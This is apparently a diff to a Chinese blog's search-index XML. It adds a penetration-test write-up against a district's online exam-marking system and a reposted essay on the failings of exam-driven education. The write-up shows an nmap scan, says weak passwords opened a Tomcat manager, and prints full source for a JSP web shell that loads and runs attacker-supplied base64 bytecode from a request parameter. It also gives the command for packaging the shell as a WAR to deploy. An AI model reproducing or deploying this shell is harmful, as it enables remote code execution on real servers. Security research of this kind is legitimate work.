@@ -4,6 +4,35 @@
   
   
   <entry>
+    <title>记一次对福州市某区网上阅卷系统的渗透测试</title>
+    <link href="/2024/09/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%A6%8F%E5%B7%9E%E5%B8%82%E6%9F%90%E5%8C%BA%E7%BD%91%E4%B8%8A%E9%98%85%E5%8D%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    <url>/2024/09/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%A6%8F%E5%B7%9E%E5%B8%82%E6%9F%90%E5%8C%BA%E7%BD%91%E4%B8%8A%E9%98%85%E5%8D%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    
+    <content type="html"><![CDATA[<h1 id="开始挖洞"><a href="#开始挖洞" class="headerlink" title="开始挖洞"></a>开始挖洞</h1><p>刚拿到ip，直接访问提示timed out，加上https也是打不开<br><img src="/2024/09/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%A6%8F%E5%B7%9E%E5%B8%82%E6%9F%90%E5%8C%BA%E7%BD%91%E4%B8%8A%E9%98%85%E5%8D%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png" alt="1"></p><p>拿出nmap扫一下<br><code>nmap -sV -v 183.xxx.xxx.xxx</code><br><img src="/2024/09/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%A6%8F%E5%B7%9E%E5%B8%82%E6%9F%90%E5%8C%BA%E7%BD%91%E4%B8%8A%E9%98%85%E5%8D%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.png" alt="2"><br>还可以，虽然有一大堆filtered，但是还是有两个端口可以</p><p>先试试8081，浏览器直接访问<br><img src="/2024/09/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%A6%8F%E5%B7%9E%E5%B8%82%E6%9F%90%E5%8C%BA%E7%BD%91%E4%B8%8A%E9%98%85%E5%8D%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png" alt="3"><br>进manager页面，弱口令直接秒杀<br><img src="/2024/09/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%A6%8F%E5%B7%9E%E5%B8%82%E6%9F%90%E5%8C%BA%E7%BD%91%E4%B8%8A%E9%98%85%E5%8D%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png" alt="4"></p><p>使用命令把jsp一句话打包成war，然后deploy上传<br>shell.jsp： </p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JSP">&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>        U(ClassLoader c) &#123;<br>            <span class="hljs-built_in">super</span>(c);<br>        &#125;<br>        <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] base64Decode(String str) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) clazz.getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke(<span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;passwd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cls != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><code>jar -cvf exam_s shell.jsp</code></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>edusrc</tag>
+      
+      <tag>JSP</tag>
+      
+      <tag>tomcat</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>翻墙软件的对手长城防火墙(GFW)是如何检测和封锁流量的</title>
     <link href="/2024/08/25/%E7%BF%BB%E5%A2%99%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%AF%B9%E6%89%8B%E9%95%BF%E5%9F%8E%E9%98%B2%E7%81%AB%E5%A2%99-GFW-%E6%98%AF%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E5%92%8C%E5%B0%81%E9%94%81%E6%B5%81%E9%87%8F%E7%9A%84/"/>
     <url>/2024/08/25/%E7%BF%BB%E5%A2%99%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%AF%B9%E6%89%8B%E9%95%BF%E5%9F%8E%E9%98%B2%E7%81%AB%E5%A2%99-GFW-%E6%98%AF%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E5%92%8C%E5%B0%81%E9%94%81%E6%B5%81%E9%87%8F%E7%9A%84/</url>
@@ -78,9 +107,9 @@
     
     <tags>
       
-      <tag>ikun</tag>
-      
       <tag>Python</tag>
+      
+      <tag>ikun</tag>
       
       <tag>Github</tag>
       
@@ -254,9 +283,9 @@
     
     <tags>
       
-      <tag>Python</tag>
-      
       <tag>GitHub</tag>
+      
+      <tag>Python</tag>
       
     </tags>
     
@@ -284,6 +313,35 @@
       <tag>sql注入</tag>
       
       <tag>edusrc</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>教育缺失：从知识到生活的断层[转]</title>
+    <link href="/2023/12/03/%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%EF%BC%9A%E4%BB%8E%E7%9F%A5%E8%AF%86%E5%88%B0%E7%94%9F%E6%B4%BB%E7%9A%84%E6%96%AD%E5%B1%82/"/>
+    <url>/2023/12/03/%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%EF%BC%9A%E4%BB%8E%E7%9F%A5%E8%AF%86%E5%88%B0%E7%94%9F%E6%B4%BB%E7%9A%84%E6%96%AD%E5%B1%82/</url>
+    
+    <content type="html"><![CDATA[<p>他会解二次函数,<br>但他不知道医院流程怎么走，<br>社保医保怎么弄。  </p><p>“我眼镜已经500多度了”<br>“那都是玩手机玩的”<br>“为中华之崛起而读书”<br>“这章不考，不讲”<br>“我发烧了”<br>“请假会落下课程进度的”<br>“妈妈，这件事我不知道该怎么办”<br>“你上学学了什么”<br>“爷爷去世为什么不跟我讲”<br>“我怕影响你学习”<br>“蛋糕好好吃”<br>“好好学习你可以天天都可以吃”  </p><p>中考上岸 高考上岸 考研上岸 考编上岸,<br>读书也不过是从这个水坑爬上岸，<br>再跳进另一个水坑，<br>不断地再上岸。</p><p>十年前，他在地理书上写下,<br><strong>此地的优势在于丰富且廉价的劳动力；</strong><br>十年后，他奔波在上班的路上，<br>听到背后隐隐约约有风声，<br>他停下来转过身去<br><strong>一颗来自十年前的子弹正中眉心。</strong></p><blockquote><p>「先生，吃人的方式又变了」  </p></blockquote><p><strong>考不上会死吗？</strong><br><strong>考不上真的会死</strong>  </p><p>会死在自卑里<br>会死在亲戚的闲言碎语里<br>死在父母失望的眼神里<br>死在自己的愧疚里<br>死在浪费的时间和金钱里  </p><p><strong>可考的上就不会死吗?</strong><br>死在没有目标的失途中<br>死在整天整夜的迷茫中<br>死在清醒的颓废中<br>或者早就死在了故乡柿子<br>又或者是那棵杨梅树下的秋千上<br>死在了童年中的某个夏天  </p><p>老师知道他的薄弱学科，<br>家人清楚他的成绩排名，<br>却唯独没人知道他是感情上嗷嗷待哺的孩子<br>从来没人教他友谊破裂、家庭不和睦、情感受挫、亲人离世、宠物生病、遇<br>到创伤、被欺凌、抑郁焦虑、孤独、寂寞、压力大时怎么办。</p><blockquote><p>「先生，教育难道是一场慢性的炎症吗?」  </p></blockquote><p>讲台下的孩子一届比一届安静，<br>班上的男生很少去追求身边的女孩。<br>那种属于年轻人本能的粗粝和莽撞，<br>那种不管不顾、奋不顾身的蓬勃活力,<br>仿佛被一条无形的绳索牵住。<br>中小学时服下的猛药,<br>到大学时代终于结下了不思考不主动的恶果。  </p><p>学生内心的疲惫构成精神生活的底色<br>现在的学生或许始终缺少「三堂课」<br><strong>性的教育 爱的教育 死亡的教育</strong><br>这三种教育分别对应<br><strong>身体的完整 精神的充沛 生命的价值</strong>  </p>]]></content>
+    
+    
+    <categories>
+      
+      <category>随笔</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>成绩</tag>
+      
+      <tag>中考</tag>
+      
+      <tag>分析</tag>
       
     </tags>
     
